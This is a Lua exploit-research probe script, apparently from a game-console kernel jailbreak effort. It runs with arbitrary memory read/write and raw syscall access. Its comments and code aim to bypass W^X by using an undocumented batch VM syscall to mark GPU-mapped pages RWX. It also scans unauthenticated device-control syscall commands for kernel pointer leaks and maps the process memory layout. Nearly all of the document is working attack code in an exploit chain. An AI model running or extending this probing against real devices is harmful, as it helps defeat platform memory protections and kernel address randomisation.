-- CRASH_CLASS: MODERATE
-- PROBE 55b: sys 548 batch VM operations + sys 547 VM query
--
-- Context: PR #5 kernel handler RE reveals:
-- sys 547 (2 args): query VM region start/end/protection for current process
-- sys 548 (5 args): batch VM operations with 5 codes including protection update
--   Code 2 = protection update via different path than mprotect
--   It normalizes prot bit 2 to imply bit 1 (EXEC implies WRITE?)
--   This is a DIFFERENT code path from mprotect — may bypass W^X
--
-- sys 622 (6 args): device control multiplexer, 300+ unauthenticated commands
--   Commands 0x200-0x270 have ZERO auth checks
--
-- Plan:
-- A) sys 547: query GPU mmap page protections
-- B) sys 548: try protection update (code 2) to add EXEC
-- C) sys 548: try other codes (map, unmap, deferred)
-- D) sys 622: probe unauthenticated commands 0x200-0x210 for info leaks

print("=== PROBE 55b: BATCH VM OPS + DEVICE CTL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

-- Get GPU mmap pages for testing
local sc_mmap = make_syscall(477)
local gpu = sc_mmap(uint64(0), uint64(4*0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gpu_h, gpu_l = get_hi_lo(gpu)
print("GPU mmap: " .. hexval(gpu))

if gpu_h == 0xFFFFFFFF or gpu_l == 0 then
    print("  GPU mmap failed!")
    print("=== PROBE 55b DONE ===")
    return
end

-- Write test pattern so we can verify read/write works
safe_wd(gpu, 0xDEADBEEF)
local verify = safe_rd(gpu)
print("Write/Read verify: " .. string.format("0x%X", verify or 0))

-- ==========================================
-- SECTION A: sys 547 — query VM region info
-- ==========================================
print("")
print("[A] sys 547: Query VM region protections")

local sc_547 = make_syscall(547)

-- arg0 = address to query, arg1 = output buffer pointer
-- Output is 24 bytes: start(8) + end(8) + prot(4) + flags(4)
local outbuf = memory.alloc(0x40)

-- Zero the buffer
for i = 0, 0x3F do
    safe_wd(outbuf + i, 0)
end

-- Query GPU mmap region
local ret547 = sc_547(uint64(gpu_l + gpu_h * 0x100000000), uint64(outbuf))
local r547 = to_num(ret547)
print("  sys 547 ret: " .. r547)

if r547 == 0 then
    local start_lo = safe_rd(outbuf)
    local start_hi = safe_rd(outbuf + 4)
    local end_lo = safe_rd(outbuf + 8)
    local end_hi = safe_rd(outbuf + 12)
    local prot = safe_rd(outbuf + 16)
    local flags = safe_rd(outbuf + 20)
    print("  Region start: " .. string.format("0x%X%08X", start_hi or 0, start_lo or 0))
    print("  Region end:   " .. string.format("0x%X%08X", end_hi or 0, end_lo or 0))
    print("  Protection:   " .. string.format("0x%X", prot or 0))
    print("  Flags:        " .. string.format("0x%X", flags or 0))

    -- Decode protection bits
    if prot then
        local r = (prot % 2 == 1) and "R" or "-"
        local w = (math.floor(prot / 2) % 2 == 1) and "W" or "-"
        local x = (math.floor(prot / 4) % 2 == 1) and "X" or "-"
        print("  Protection decoded: " .. r .. w .. x)
    end
else
    print("  sys 547 failed, trying alternate arg layout")
    -- Maybe address needs to be page-aligned differently
    local aligned = uint64(string.format("0x%X%08X", gpu_h,
        math.floor(gpu_l / 0x4000) * 0x4000))
    ret547 = sc_547(aligned, uint64(outbuf))
    r547 = to_num(ret547)
    print("  Aligned retry ret: " .. r547)
end

-- Also query eboot .text region
print("")
print("  Query eboot region:")
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = safe_rd(info + 0x108)
local text_hi = safe_rd(info + 0x10C)

if text_lo and text_hi then
    -- Zero output buffer
    for i = 0, 0x3F do safe_wd(outbuf + i, 0) end

    local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
    ret547 = sc_547(eboot, uint64(outbuf))
    r547 = to_num(ret547)
    print("  eboot query ret: " .. r547)
    if r547 == 0 then
        local prot = safe_rd(outbuf + 16)
        local flags = safe_rd(outbuf + 20)
        print("  eboot prot: " .. string.format("0x%X", prot or 0))
        print("  eboot flags: " .. string.format("0x%X", flags or 0))
    end
end

-- ==========================================
-- SECTION B: sys 548 — batch VM protection update
-- ==========================================
print("")
print("[B] sys 548: Batch VM protection update")

local sc_548 = make_syscall(548)

-- Handler RE says: 5 args
-- From analysis: arg+0x00 = flags/descriptor, arg+0x08 = ?, arg+0x10 = user array ptr
--   arg+0x18 = signed operation count, arg+0x20 = ?
-- Each operation in array is 0x20 bytes with code at +0x1c
--
-- But let's first try the simplest approach:
-- The handler reads a signed count at uap+0x18 and processes operations
-- from a user array. Each op is 0x20 bytes.
--
-- Operation code 2 = protection update
-- Let's build a single operation to change GPU page protection to RWX

-- Build operation descriptor (0x20 bytes)
local op = memory.alloc(0x40)

-- Try code 2 (protection update) on GPU pages
-- From RE: range-protection block at 0xabc0b0
-- It calls 0x2cbdb0 with address/length and new protection
-- "normalizes protection bit 2 to imply bit 1" means if EXEC set, WRITE is implied

-- Operation format (guessing from RE, 0x20 bytes):
-- +0x00: address (8 bytes)
-- +0x08: length (8 bytes)
-- +0x10: new protection (4 bytes) + padding
-- +0x14: memory type or flags (4 bytes)
-- +0x18: auxiliary (4 bytes)
-- +0x1c: operation code (4 bytes)

-- Try 1: protection update (code 2) to RWX (prot=7)
safe_wq(op + 0x00, gpu)           -- address
safe_wq(op + 0x08, uint64(0x4000)) -- length (1 page = 16KB)
safe_wd(op + 0x10, 7)              -- protection = RWX (7)
safe_wd(op + 0x14, 0)              -- memory type
safe_wd(op + 0x18, 0)              -- auxiliary
safe_wd(op + 0x1C, 2)              -- code = 2 (protection update)

-- Build syscall args
-- arg0 = flags? arg1 = ?, arg2 = op array, arg3 = count, arg4 = processed output
local processed = memory.alloc(8)
safe_wd(processed, 0)

-- Try layout 1: (flags, unk, array_ptr, count, output_ptr)
print("  Try 1: code=2, prot=7 (RWX)")
local ok548, ret548 = pcall(function()
    return sc_548(uint64(0), uint64(0), uint64(op), uint64(1), uint64(processed))
end)
if ok548 then
    local r = to_num(ret548)
    local proc_count = safe_rd(processed)
    print("  ret=" .. r .. "  processed=" .. (proc_count or "nil"))
else
    print("  CRASHED: " .. tostring(ret548))
end

-- Check if GPU page is now executable
print("")
print("  Verify GPU page after sys 548:")
local verify2 = safe_rd(gpu)
print("  Read: " .. string.format("0x%X", verify2 or 0))

-- Re-query with sys 547
for i = 0, 0x3F do safe_wd(outbuf + i, 0) end
local ok_q, ret_q = pcall(function()
    return sc_547(uint64(gpu_l + gpu_h * 0x100000000), uint64(outbuf))
end)
if ok_q then
    local rq = to_num(ret_q)
    if rq == 0 then
        local prot = safe_rd(outbuf + 16)
        print("  Post-548 protection: " .. string.format("0x%X", prot or 0))
        if prot and math.floor(prot / 4) % 2 == 1 then
            print("  >>> EXEC BIT SET! W^X BYPASSED VIA sys 548!")
        end
    else
        print("  Query ret: " .. rq)
    end
end

-- Try layout 2: different arg order
print("")
print("  Try 2: alternate arg layout")
safe_wd(processed, 0)
local ok548b, ret548b = pcall(function()
    return sc_548(uint64(op), uint64(1), uint64(0), uint64(processed), uint64(0))
end)
if ok548b then
    local r = to_num(ret548b)
    local proc_count = safe_rd(processed)
    print("  ret=" .. r .. "  processed=" .. (proc_count or "nil"))
else
    print("  CRASHED: " .. tostring(ret548b))
end

-- Try code 0 (mapping) — maybe we can create a new RWX mapping
print("")
print("  Try 3: code=0 (new mapping)")
safe_wd(op + 0x1C, 0)  -- code = 0
safe_wd(op + 0x10, 7)  -- prot = RWX
safe_wd(processed, 0)
local ok548c, ret548c = pcall(function()
    return sc_548(uint64(0), uint64(0), uint64(op), uint64(1), uint64(processed))
end)
if ok548c then
    print("  ret=" .. to_num(ret548c) .. "  processed=" .. (safe_rd(processed) or "nil"))
else
    print("  CRASHED: " .. tostring(ret548c))
end

-- Try code 3 (anonymous-style mapping with flags | 0x1000)
print("")
print("  Try 4: code=3 (anonymous mapping)")
safe_wd(op + 0x1C, 3)
safe_wd(op + 0x10, 7)  -- prot = RWX
safe_wd(processed, 0)
local ok548d, ret548d = pcall(function()
    return sc_548(uint64(0), uint64(0), uint64(op), uint64(1), uint64(processed))
end)
if ok548d then
    print("  ret=" .. to_num(ret548d) .. "  processed=" .. (safe_rd(processed) or "nil"))
else
    print("  CRASHED: " .. tostring(ret548d))
end

-- ==========================================
-- SECTION C: sys 622 — unauthenticated device commands
-- ==========================================
print("")
print("[C] sys 622: Unauthenticated device commands")

local sc_622 = make_syscall(622)

-- 6 args: cmd, subcmd, user_buf_ptr, secondary_addr, buf_size, extra
-- Commands 0x200-0x270 have ZERO auth
-- copyin wrapper copies up to 64 bytes from arg3

local devbuf = memory.alloc(0x100)

-- Scan commands 0x200-0x210 for non-error returns
for cmd = 0x200, 0x210 do
    -- Zero output buffer
    for i = 0, 0x7F do safe_wd(devbuf + i, 0) end

    local ok622, ret622 = pcall(function()
        return sc_622(uint64(cmd), uint64(0), uint64(devbuf),
            uint64(devbuf + 0x80), uint64(0x40), uint64(0))
    end)

    if ok622 then
        local r = to_num(ret622)
        if r ~= 0x800E0001 and r ~= 0xFFFFFFFF then
            print(string.format("  cmd 0x%X: ret=0x%X", cmd, r))
            -- Check if anything was written to buffer
            local d0 = safe_rd(devbuf)
            local d4 = safe_rd(devbuf + 4)
            local d8 = safe_rd(devbuf + 8)
            if (d0 and d0 ~= 0) or (d4 and d4 ~= 0) or (d8 and d8 ~= 0) then
                print(string.format("    buf: %08X %08X %08X", d0 or 0, d4 or 0, d8 or 0))
                -- Scan for kernel pointers
                for off = 0, 0x3C, 4 do
                    local lo = safe_rd(devbuf + off)
                    local hi = safe_rd(devbuf + off + 4)
                    if hi and hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                        print(string.format("    >>> KERNEL PTR at +%X: 0x%08X_%08X", off, hi, lo or 0))
                    end
                end
            end
        end
    end
end

-- Try cmd 0x520 (direct call, no auth)
print("")
print("  cmd 0x520 (direct, no auth):")
for i = 0, 0x7F do safe_wd(devbuf + i, 0) end
local ok520, ret520 = pcall(function()
    return sc_622(uint64(0x520), uint64(0), uint64(devbuf),
        uint64(devbuf + 0x80), uint64(0x40), uint64(0))
end)
if ok520 then
    print("  ret=0x" .. string.format("%X", to_num(ret520)))
    local d0 = safe_rd(devbuf)
    if d0 and d0 ~= 0 then
        print(string.format("  buf: %08X", d0))
    end
else
    print("  CRASHED: " .. tostring(ret520))
end

-- Try unauthenticated 0x100-range commands (bitmap bit not set)
-- These skip auth: 0x101, 0x103, 0x105, 0x108-0x10F
print("")
print("  Unauthenticated 0x100-range commands:")
local unauth_cmds = {0x101, 0x103, 0x105, 0x108, 0x109, 0x10A, 0x10B, 0x10C}
for _, cmd in ipairs(unauth_cmds) do
    for i = 0, 0x7F do safe_wd(devbuf + i, 0) end
    local ok_c, ret_c = pcall(function()
        return sc_622(uint64(cmd), uint64(0), uint64(devbuf),
            uint64(devbuf + 0x80), uint64(0x40), uint64(0))
    end)
    if ok_c then
        local r = to_num(ret_c)
        if r ~= 0x800E0001 and r ~= 0xFFFFFFFF then
            print(string.format("  cmd 0x%X: ret=0x%X", cmd, r))
            local d0 = safe_rd(devbuf)
            local d4 = safe_rd(devbuf + 4)
            if (d0 and d0 ~= 0) or (d4 and d4 ~= 0) then
                print(string.format("    buf: %08X %08X", d0 or 0, d4 or 0))
            end
        end
    end
end

-- ==========================================
-- SECTION D: sys 547 on stack/heap to map VM layout
-- ==========================================
print("")
print("[D] sys 547: Map VM layout")

-- Query various memory regions to understand the VM map
local test_addrs = {}
-- Stack (approximate)
local stack_var = memory.alloc(8)
table.insert(test_addrs, {"heap_alloc", stack_var})
table.insert(test_addrs, {"gpu_mmap", gpu})
if text_lo and text_hi then
    table.insert(test_addrs, {"eboot", uint64(string.format("0x%X%08X", text_hi, text_lo))})
end

for _, entry in ipairs(test_addrs) do
    local name = entry[1]
    local addr = entry[2]
    for i = 0, 0x3F do safe_wd(outbuf + i, 0) end
    local ok_v, ret_v = pcall(function()
        return sc_547(addr, uint64(outbuf))
    end)
    if ok_v and to_num(ret_v) == 0 then
        local s_lo = safe_rd(outbuf)
        local s_hi = safe_rd(outbuf + 4)
        local e_lo = safe_rd(outbuf + 8)
        local e_hi = safe_rd(outbuf + 12)
        local prot = safe_rd(outbuf + 16)
        local flags = safe_rd(outbuf + 20)
        local r_c = (prot and prot % 2 == 1) and "R" or "-"
        local w_c = (prot and math.floor(prot / 2) % 2 == 1) and "W" or "-"
        local x_c = (prot and math.floor(prot / 4) % 2 == 1) and "X" or "-"
        print(string.format("  %-12s %X%08X-%X%08X  %s  flags=0x%X",
            name, s_hi or 0, s_lo or 0, e_hi or 0, e_lo or 0,
            r_c..w_c..x_c, flags or 0))
    else
        print(string.format("  %-12s ret=%s", name, tostring(ok_v and to_num(ret_v) or ret_v)))
    end
end

print("")
print("=== PROBE 55b COMPLETE ===")
